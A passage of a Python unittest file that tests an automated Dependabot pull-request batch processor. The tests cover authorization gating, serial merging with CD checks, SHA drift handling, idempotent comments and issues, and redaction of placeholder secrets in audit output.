        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        with self.assertRaises(batch.SnapshotDrift):
            batch.ExpectedSHAWriter(gate).run(
                "push-fix",
                expected,
                lambda: current,
                lambda *_: None,
            )

    def test_serial_merge_waits_for_cd_before_second_merge(self) -> None:
        prs = (pull_request(2), pull_request(1, head_sha=sha("c")))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        current = {pr.number: pr for pr in prs}
        merge_calls: list[int] = []
        cd_calls: list[str] = []
        result = batch.SerialMerger(gate).merge_in_order(
            prs,
            refetch=lambda number: current[number],
            ci_success_for_head=lambda _: True,
            merge=lambda head: merge_calls.append(1) or sha("f"),
            wait_for_cd=lambda merged_sha: cd_calls.append(merged_sha) or True,
        )
        self.assertEqual([item.pr_number for item in result], [1, 2])
        self.assertEqual(len(merge_calls), 2)
        self.assertEqual(cd_calls, [sha("f"), sha("f")])

    def test_cd_failure_stops_later_merges_without_revert(self) -> None:
        prs = (pull_request(1), pull_request(2, head_sha=sha("c")))
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        merged: list[int] = []
        result = batch.SerialMerger(gate).merge_in_order(
            prs,
            refetch=lambda number: prs[number - 1],
            ci_success_for_head=lambda _: True,
            merge=lambda _: merged.append(1) or sha("f"),
            wait_for_cd=lambda _: False,
        )
        self.assertEqual(len(merged), 1)
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].reason, "cd-failed-or-timeout")

    def test_base_drift_updates_branch_with_expected_head_and_revalidates_new_pair(self) -> None:
        expected = pull_request(1, base_sha=sha("a"), head_sha=sha("b"))
        changed_base = pull_request(1, base_sha=sha("c"), head_sha=sha("b"))
        updated = pull_request(1, base_sha=sha("c"), head_sha=sha("d"))
        reads = iter((changed_base, changed_base, updated, updated))
        updates: list[tuple[int, str, str]] = []
        revalidated: list[tuple[str, str]] = []
        merged: list[str] = []
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.SerialMerger(gate).merge_in_order(
            (expected,),
            refetch=lambda _: next(reads),
            ci_success_for_head=lambda head: revalidated.append(("ci", head)) or True,
            merge=lambda head: merged.append(head) or sha("f"),
            wait_for_cd=lambda _: True,
            update_branch=lambda number, head, base: updates.append((number, head, base)) or updated,
            revalidate=lambda pr: revalidated.append((pr.head_sha, pr.base_sha)) or True,
        )
        self.assertEqual(updates, [(1, sha("b"), sha("c"))])
        self.assertEqual(revalidated, [(sha("d"), sha("c")), ("ci", sha("d"))])
        self.assertEqual(merged, [sha("d")])
        self.assertEqual(result[0].reason, "merged-and-cd-verified")

    def test_base_update_failure_retains_pr_open_and_stops_serial_merge(self) -> None:
        expected = pull_request(1, base_sha=sha("a"), head_sha=sha("b"))
        changed_base = pull_request(1, base_sha=sha("c"), head_sha=sha("b"))
        merged: list[str] = []
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.SerialMerger(gate).merge_in_order(
            (expected,),
            refetch=lambda _: changed_base,
            ci_success_for_head=lambda _: (_ for _ in ()).throw(AssertionError("stale CI must not run")),
            merge=lambda head: merged.append(head) or sha("f"),
            wait_for_cd=lambda _: True,
            update_branch=lambda *_: pull_request(1, base_sha=sha("c"), head_sha=sha("b")),
            revalidate=lambda _: True,
        )
        self.assertEqual(merged, [])
        self.assertEqual(result[0].status, batch.Status.OPEN.value)
        self.assertEqual(result[0].reason, "base-freshness-update-failed")

    def test_base_drift_is_revalidated_for_later_pr_after_first_merge(self) -> None:
        first = pull_request(1, base_sha=sha("a"), head_sha=sha("b"))
        second = pull_request(2, base_sha=sha("a"), head_sha=sha("c"))
        changed_second = pull_request(2, base_sha=sha("d"), head_sha=sha("c"))
        refreshed_second = pull_request(2, base_sha=sha("d"), head_sha=sha("e"))
        state = {1: first, 2: changed_second}
        calls = {1: 0, 2: 0}
        updates: list[tuple[int, str, str]] = []
        revalidated: list[int] = []

        def refetch(number: int) -> batch.PullRequestSnapshot:
            calls[number] += 1
            return state[number]

        def update(number: int, head: str, base: str) -> batch.PullRequestSnapshot:
            updates.append((number, head, base))
            state[number] = refreshed_second
            return refreshed_second

        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        result = batch.SerialMerger(gate).merge_in_order(
            (first, second),
            refetch=refetch,
            ci_success_for_head=lambda _: True,
            merge=lambda _: sha("f"),
            wait_for_cd=lambda _: True,
            update_branch=update,
            revalidate=lambda pr: revalidated.append(pr.number) or True,
        )
        self.assertEqual([item.status for item in result], [batch.Status.SUCCESS.value] * 2)
        self.assertEqual(updates, [(2, sha("c"), sha("d"))])
        self.assertEqual(revalidated, [2])


class FakeBatchAdapter:
    """No-network adapter used to exercise the executable state machine."""

    def __init__(
        self,
        *,
        ci_mode: str = "success",
        missing_first_member: bool = False,
        drift_kind: str | None = None,
        local_failure: bool = False,
    ) -> None:
        self.events: list[str] = []
        self.mutations: list[str] = []
        self.ci_mode = ci_mode
        self.missing_first_member = missing_first_member
        self.drift_kind = drift_kind
        self.local_failure = local_failure
        self.prs = [pull_request(1), pull_request(2, head_sha=sha("c"))]
        self.current = {pr.number: pr for pr in self.prs}

    def read_pull_requests(self):
        self.events.append("read-prs")
        return tuple(self.prs)

    def read_repair_chain(self, pr):
        self.events.append(f"read-chain:{pr.number}")
        return ()

    def read_dependency_diff(self, pr):
        self.events.append(f"preflight-read:{pr.number}")
        return grouped_diff(missing_metadata="package-2" if self.missing_first_member and pr.number == 1 else None, package_count=3)

    def footprint(self, pr, diff):
        self.events.append(f"footprint:{pr.number}")
        return batch.FootprintedItem(pr.number, batch.footprint_for_paths(pr.changed_files))

    def run_matrix_and_docker(self, pr, changes):
        self.events.append(f"matrix-docker:{pr.number}")
        return not self.local_failure

    def observe_ci(self, expected_head_sha):
        self.events.append(f"observe-ci:{expected_head_sha[0]}")
        if self.ci_mode == "unknown":
            return batch.CIObservation(
                expected_head_sha,
                (batch.CheckObservation("ci", "completed", "failure"),),
            )
        if self.ci_mode == "dependency":
            return batch.CIObservation(
                expected_head_sha,
                (batch.CheckObservation("ci", "completed", "failure"),),
                main_success=True,
                pr_reproducible=True,
                dependency_causation=True,
            )
        return batch.CIObservation(
            expected_head_sha,
            (batch.CheckObservation("ci", "completed", "success"),),
        )

    def rerun_ci(self, pr, observation, expected_head_sha):
        self.mutations.append(f"rerun:{pr.number}")

    def repair_run_id(self, pr):
        return 7

    def diagnose_repair(self, pr, cycle, head_sha):
        self.events.append(f"diagnose:{pr.number}:{cycle}")
        return batch.RepairDiagnosis(True, False, "no safe fixture fix")

    def create_fix_commit(self, pr, diagnosis, marker, message):
        return batch.FixCommit(
            sha("d"), message, marker, pr.number, 7, pr.head_sha,
            "github-actions[bot]", "github-actions[bot]", True, (pr.head_sha,), True,
        )

    def push_fix(self, pr, expected_head_sha, commit):
        self.mutations.append(f"push:{pr.number}")
        self.current[pr.number] = batch.PullRequestSnapshot(**{**self.current[pr.number].__dict__, "head_sha": commit.sha})

    def read_current_pr(self, number):
        self.events.append(f"read-current:{number}")
        current = self.current[number]
        if self.drift_kind == "head":
            return batch.PullRequestSnapshot(**{**current.__dict__, "head_sha": sha("e")})
        if self.drift_kind == "base":
            return batch.PullRequestSnapshot(**{**current.__dict__, "base_sha": sha("d")})
        return current

    def update_branch(self, number, expected_head_sha, expected_base_sha):
        self.mutations.append(f"update:{number}:{expected_head_sha}:{expected_base_sha}")
        old = self.current[number]
        updated = batch.PullRequestSnapshot(**{**old.__dict__, "head_sha": sha("e"), "base_sha": expected_base_sha})
        self.current[number] = updated
        return updated

    def rebuild_snapshot(self, pr):
        self.events.append(f"rebuild:{pr.number}")
        return pr

    def revalidate(self, pr, changes):
        self.events.append(f"revalidate:{pr.number}:{pr.head_sha[0]}:{pr.base_sha[0]}")
        return True

    def ci_success_for_head(self, head_sha):
        return True

    def merge_pr(self, number, expected_head_sha):
        self.mutations.append(f"merge:{number}:{expected_head_sha}")
        return sha("f")

    def wait_for_cd(self, merge_sha):
        self.events.append(f"cd:{merge_sha[0]}")
        return True

    def read_comments(self, number):
        self.events.append(f"read-comments:{number}")
        return ()

    def create_comment(self, number, body):
        self.mutations.append(f"comment:{number}")
        return batch.CommentRecord(number, body)

    def update_comment(self, comment_id, body):
        self.mutations.append(f"comment-update:{comment_id}")
        return batch.CommentRecord(comment_id, body)

    def read_followup_issues(self):
        self.events.append("read-issues")
        return ()

    def create_followup_issue(self, body):
        self.mutations.append("issue-create")
        return batch.IssueRecord(100, "open", body)

    def update_followup_issue(self, number, body):
        self.mutations.append(f"issue-update:{number}")
        return batch.IssueRecord(number, "open", body)

    def close_pr(self, number, expected_head_sha):
        self.mutations.append(f"close:{number}:{expected_head_sha}")


class OrchestrationTests(unittest.TestCase):
    def test_write_state_machine_orders_complete_preflight_before_execution_and_merges(self) -> None:
        adapter = FakeBatchAdapter()
        result = batch.execute_batch(
            adapter,
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.WRITE,
            ci_waiter=batch.CIWaiter(poll_seconds=0, deadline_seconds=1),
        )
        self.assertEqual(result.status, "completed")
        self.assertEqual([report.status for report in result.reports], [batch.Status.SUCCESS.value] * 2)
        self.assertEqual(len(result.merge_results), 2)
        self.assertEqual(
            result.events.index("all-grouped-preflight-complete") < result.events.index("matrix-docker:1"),
            True,
        )
        self.assertIn("merge:1:" + sha("b"), adapter.mutations)
        self.assertIn("merge:2:" + sha("c"), adapter.mutations)

    def test_write_mode_external_or_ambiguous_instruction_denies_before_mutation(self) -> None:
        for instruction, source in (("process Dependabot PRs", "github-comment"), ("maybe process them", "current_turn_human")):
            adapter = FakeBatchAdapter()
            result = batch.BatchOrchestrator(adapter).run(
                current_turn_instruction=instruction,
                instruction_source=source,
                mode=batch.Mode.WRITE,
            )
            self.assertEqual(result.status, "blocked")
            self.assertFalse(adapter.mutations)
            self.assertIn("write-denied-before-state-machine", result.events)

    def test_audit_mode_is_read_only_and_does_not_execute_dependencies(self) -> None:
        adapter = FakeBatchAdapter()
        result = batch.BatchOrchestrator(adapter).run(
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.AUDIT_ONLY,
        )
        self.assertEqual(result.status, "completed")
        self.assertFalse(adapter.mutations)
        self.assertNotIn("matrix-docker:1", adapter.events)
        self.assertEqual(result.merge_results, ())

    def test_grouped_preflight_failure_prevents_that_member_execution(self) -> None:
        adapter = FakeBatchAdapter(missing_first_member=True)
        result = batch.BatchOrchestrator(adapter).run(
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.WRITE,
        )
        first = next(report for report in result.reports if report.pr_number == 1)
        self.assertEqual(first.status, batch.Status.OPEN.value)
        self.assertNotIn("matrix-docker:1", adapter.events)
        self.assertIn("matrix-docker:2", adapter.events)
        self.assertLess(
            result.events.index("all-grouped-preflight-complete"),
            result.events.index("matrix-docker:2"),
        )

    def test_external_ci_is_retained_open_and_not_merged_or_closed(self) -> None:
        adapter = FakeBatchAdapter(ci_mode="unknown")
        result = batch.BatchOrchestrator(adapter).run(
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.WRITE,
        )
        self.assertTrue(all(report.status == batch.Status.OPEN.value for report in result.reports))
        self.assertFalse(any(item.startswith("merge:") or item.startswith("close:") for item in adapter.mutations))
        self.assertIn("issue-create", adapter.mutations)

    def test_local_failure_uses_open_marker_and_issue_path_without_merge(self) -> None:
        adapter = FakeBatchAdapter(local_failure=True)
        result = batch.execute_batch(
            adapter,
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.WRITE,
        )
        self.assertTrue(all(report.status == batch.Status.OPEN.value for report in result.reports))
        self.assertIn("comment:1", adapter.mutations)
        self.assertIn("issue-create", adapter.mutations)
        self.assertFalse(any(item.startswith("merge:") or item.startswith("close:") for item in adapter.mutations))

    def test_dependency_failure_with_no_fix_closes_only_after_comment_and_keeps_no_merge(self) -> None:
        adapter = FakeBatchAdapter(ci_mode="dependency")
        result = batch.BatchOrchestrator(adapter).run(
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.WRITE,
        )
        self.assertEqual(result.status, "completed")
        self.assertIn("repair:1", result.events)
        self.assertIn("diagnose:1:1", adapter.events)
        self.assertIn("comment:1", adapter.mutations)
        self.assertIn("close:1:" + sha("b"), adapter.mutations)
        self.assertFalse(any(item.startswith("merge:") for item in adapter.mutations))

    def test_expected_head_drift_keeps_candidate_open_and_halts_merge(self) -> None:
        adapter = FakeBatchAdapter(drift_kind="head")
        result = batch.BatchOrchestrator(adapter).run(
            current_turn_instruction="process Dependabot PRs",
            mode=batch.Mode.WRITE,
        )
        self.assertTrue(all(item.status == batch.Status.OPEN.value for item in result.merge_results) or not result.merge_results)
        self.assertFalse(any(item.startswith("merge:") for item in adapter.mutations))
        self.assertFalse(adapter.mutations)


class IdempotencyIssueAndAuditTests(unittest.TestCase):
    def test_state_is_reconstructed_from_github_records(self) -> None:
        pr = pull_request()
        fix_marker = batch.make_fix_marker(1, pr.head_sha)
        fix = commit(
            "c",
            actor="github-actions[bot]",
            message=f"fix\n\n{batch.FIX_TRAILER}: {fix_marker}",
        )
        fix = batch.CommitSnapshot(**{**fix.__dict__, "parents": (pr.head_sha,)})
        pr = batch.PullRequestSnapshot(
            **{
                **pr.__dict__,
                "commits": (fix,),
            }
        )
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        state = batch.reconstruct_state(
            pr,
            comments=[batch.CommentRecord(1, batch.embed_marker("comment", marker))],
            issues=[batch.IssueRecord(2, "open", batch.embed_marker("issue", marker))],
            repair_chain=[
                batch.RepairCommitRecord(
                    1, 1, pr.head_sha, sha("c"), fix_marker,
                    "github-actions[bot]", "github-actions[bot]",
                )
            ],
        )
        self.assertEqual(state.fix_markers, (fix_marker,))
        self.assertEqual(state.comment_markers, (marker,))
        self.assertEqual(state.issue_markers, (marker,))

    def test_marker_comment_updates_instead_of_creating_duplicate(self) -> None:
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        existing = batch.CommentRecord(10, batch.embed_marker("old", marker))
        plan = batch.plan_idempotent_comment(marker, "new", [existing])
        self.assertEqual(plan.action, "update")
        self.assertEqual(plan.comment_id, 10)
        self.assertEqual(batch.marker_in_body(plan.body, marker), True)

    def test_reconstruct_issue_reuses_open_and_references_closed(self) -> None:
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        open_issue = batch.IssueRecord(8, "open", batch.embed_marker("open", marker))
        closed_issue = batch.IssueRecord(9, "closed", batch.embed_marker("closed", marker))
        self.assertEqual(batch.plan_followup_issue(marker, [open_issue]).action, "reuse-open")
        self.assertEqual(batch.plan_followup_issue(marker, [closed_issue]).action, "reference-closed")
        self.assertEqual(batch.plan_followup_issue(marker, []).action, "create")

    def test_followup_issue_manager_reuses_closed_and_rechecks_after_create(self) -> None:
        marker = batch.make_idempotency_marker("portal", "pkg", "1", "2")
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))

        class Writer:
            def __init__(self) -> None:
                self.created = 0

            def create(self, body: str) -> batch.IssueRecord:
                self.created += 1
                return batch.IssueRecord(10, "open", body, "https://github.com/issues/10")

            def update(self, number: int, body: str) -> batch.IssueRecord:
                return batch.IssueRecord(number, "open", body)

        writer = Writer()
        records: list[batch.IssueRecord] = []

        def search() -> list[batch.IssueRecord]:
            return records.copy()

        # A real writer would make the record visible to the second search;
        # model that boundary here.
        original_create = writer.create

        def create_and_publish(body: str) -> batch.IssueRecord:
            issue = original_create(body)
            records.append(issue)
            return issue

        writer.create = create_and_publish  # type: ignore[method-assign]
        plan = batch.FollowupIssueManager(gate).ensure(
            marker,
            batch.embed_marker("body", marker),
            search_all=search,
            writer=writer,
        )
        self.assertEqual(plan.action, "created")
        self.assertEqual(writer.created, 1)
        closed = batch.IssueRecord(11, "closed", batch.embed_marker("closed", marker))
        records[:] = [closed]
        plan = batch.FollowupIssueManager(gate).ensure(
            marker,
            closed.body,
            search_all=search,
            writer=writer,
        )
        self.assertEqual(plan.action, "reference-closed")
        self.assertEqual(writer.created, 1)

    def test_disposition_executor_comments_before_close_and_stops_on_second_drift(self) -> None:
        expected = pull_request()
        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
        calls: list[str] = []
        latest = iter((expected, pull_request(head_sha=sha("e"))))
        result = batch.DispositionExecutor(gate).apply(
            expected,
            disposition="close",
            read_current=lambda: next(latest),
            comment=lambda _: calls.append("comment"),
            close=lambda _: calls.append("close"),
            comment_body="理由",
        )
        self.assertEqual(result, "open")
        self.assertEqual(calls, ["comment"])

    def test_close_only_for_reproducible_dependency_or_clear_supply_chain_refusal(self) -> None:
        self.assertEqual(
            batch.disposition_for(classification="dependency-incompatibility"), "close"
        )
        self.assertEqual(
            batch.disposition_for(
                classification="external/unknown",
                preflight=batch.PreflightResult(batch.PreflightStatus.BLOCKED, ("unexpected-registry",)),
            ),
            "close",
        )
        self.assertEqual(batch.disposition_for(classification="timeout"), "open")
        self.assertEqual(batch.disposition_for(classification="external/unknown", push_allowed=False), "open")

    def test_audit_aggregation_redacts_secrets_and_does_not_include_raw_log(self) -> None:
        aggregator = batch.AuditAggregator()
        aggregator.add(
            batch.AuditRecord(
                1,
                "https://github.com/u7chan/monorepo/pull/1?token=secret-value",
                sha("a"),
                sha("b"),
                "open",
                "Bearer ghp_abcdefghijklmnopqrstuvwxyz0123456789",
                check_urls=("https://github.com/run/1?api_key=secret",),
                remaining="password=secret-value",
            )
        )
        rendered = aggregator.render_markdown()
        self.assertNotIn("secret-value", rendered)
        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz0123456789", rendered)
        self.assertNotIn("raw log", rendered)
        self.assertIn("[REDACTED]", rendered)


if __name__ == "__main__":
    unittest.main()
